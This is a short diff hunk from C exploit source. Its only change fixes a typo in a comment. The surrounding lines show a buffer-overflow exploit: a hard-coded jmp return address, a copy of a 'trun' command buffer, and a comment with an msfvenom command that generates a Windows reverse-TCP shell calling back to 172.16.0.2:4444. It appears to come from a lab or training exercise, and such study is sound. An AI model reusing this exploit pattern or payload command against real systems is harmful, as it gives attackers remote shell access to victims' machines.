@@ -70,7 +70,7 @@ int main() {
   bufPad = (char *)malloc(sizeof(char) * 32);
   strcpy(shellcode, trun);
   
-  // memory location off jmp instruction
+  // memory location of jmp instruction
   char *memJmp = "\xaf\x11\x50\x62";
 
   //msfvenom -p windows/shell_reverse_tcp LHOST=172.16.0.2 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
